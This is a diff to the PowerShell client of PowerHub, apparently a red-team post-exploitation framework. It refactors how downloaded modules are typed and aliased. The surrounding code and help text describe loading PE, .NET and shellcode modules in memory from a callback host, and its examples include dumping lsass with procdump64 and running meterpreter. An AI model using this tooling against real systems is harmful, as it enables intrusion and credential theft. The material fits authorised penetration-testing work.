@@ -17,7 +17,9 @@ $WEBDAV_USER = "{{webdav_user}}"
 $WEBDAV_PASS = "{{webdav_pass}}"
 {# $WebClient is defined in stage2 #}
 {# The actual code (i.e. the content) of the modules is stored in this separate hashtable #}
-$PowerHubModulesContent = @{ {{preloaded_modules}} }
+class PowerHubModule { [String]$Name; [String]$Type; [Int]$N; [Bool]$Loaded; [String]$Alias }
+$PowerHubModulesContent = @{ {{preloaded_modules_content}} }
+$PowerHubModules = @( {{preloaded_modules}} )
 
 $CALLBACK_HOST = [regex]::Match($CALLBACK_URL, '(.+/)([^:/]+)((:|/).*)').captures.groups[2].value
 $PS_VERSION = $PSVersionTable.PSVersion.Major
@@ -137,6 +139,7 @@ function Update-HubModules {
     $Global:PowerHubModules = $ModuleList
     foreach ($m in $PowerHubModules) {
         $m.n = [Int]($m.n)
+        $m | Add-Member -TypeName  "PowerHubModule"
         if ($PowerHubModulesContent.ContainsKey($m.Name)) {
             $m.Loaded = $True
         } else {
@@ -282,22 +285,25 @@ Use the '-Verbose' option to print detailed information.
                     Import-HubModule $module
                 } else {
                     $PowerHubModulesContent.($module.Name) = Transport-String "module" $transport_args $True
-                    # Get Basename
-                    if ($Module.Name.Contains('/')) {
-                        $AliasName = $Module.Name.split('/')
-                        $AliasName = $AliasName[$AliasName.Length - 1]
-                    } else {
-                        $AliasName = $Module.Name
-                    }
-                    # Create alias
-                    if ($module.Type -eq 'dotnet') {
-                        New-DotNetAlias $module -Name $AliasName | Out-Null
-                    } elseif ($module.Type -eq 'pe') {
-                        New-ExeAlias $module -Name $AliasName | Out-Null
-                    }
                 }
                 $module.Loaded = $True
             }
+
+            # Set Alias in two steps
+            # 1. Get Basename
+            if ($Module.Name.Contains('/')) {
+                $AliasName = $Module.Name.split('/')
+                $AliasName = $AliasName[$AliasName.Length - 1]
+            } else {
+                $AliasName = $Module.Name
+            }
+            # 2. Create alias
+            if ($module.Type -eq 'dotnet') {
+                New-DotNetAlias $module -Name $AliasName | Out-Null
+            } elseif ($module.Type -eq 'pe') {
+                New-ExeAlias $module -Name $AliasName | Out-Null
+            }
+
             $result += $module
         }
     }
@@ -355,7 +361,7 @@ Run the binary whose name matches 'procdump64' in memory and dump the lsass proc
 #>
     Param(
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module,
+        [PSTypeName("PowerHubModule")] $Module,
 
         [parameter(Mandatory=$false,Position=1)] [String] $ExeArgs,
 
@@ -418,7 +424,7 @@ Load the PE module with the name 'meterpreter.exe' in memory and save it to disk
 #>
     Param(
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module,
+        [PSTypeName("PowerHubModule")] $Module,
 
         [parameter(Mandatory=$false,Position=1)] $Directory = ""
     )
@@ -457,7 +463,7 @@ Name of the new alias. Default: the module's name.
     Param(
         [parameter(Mandatory=$false)] [String] $Name,
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module
+        [PSTypeName("PowerHubModule")] $Module
     )
     $Function = {
         $Module | Run-Exe -ExeArgs ([string[]]$args -join " ")
@@ -504,7 +510,7 @@ Load the shellcode module with the name 'meterpreter.bin' in memory and run it
 #>
     Param(
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module,
+        [PSTypeName("PowerHubModule")] $Module,
 
         [ValidateNotNullOrEmpty()] [UInt16] $ProcessID
     )
@@ -573,7 +579,7 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
 
     Param(
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module,
+        [PSTypeName("PowerHubModule")] $Module,
 
         [parameter(Mandatory=$false)] [String] $OutFile,
 
@@ -628,7 +634,7 @@ Name of the new alias. Default: the module's name.
     Param(
         [parameter(Mandatory=$false)] [String] $Name,
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
-        [PSTypeName("PowerHub.Module")] $Module
+        [PSTypeName("PowerHubModule")] $Module
     )
     $Function = {
         $Module | Run-DotNETExe -Arguments ([string[]]$args)
@@ -939,7 +945,7 @@ Update-HubModules | Out-Null
 foreach ($name in $PowerHubModulesContent.Keys) {
     foreach ($m in $PowerHubModules) {
         if ($m.Name -eq $name) {
-            Get-HubModule $m.n
+            Get-HubModule $m.n | Out-Null
             break
         }
     }
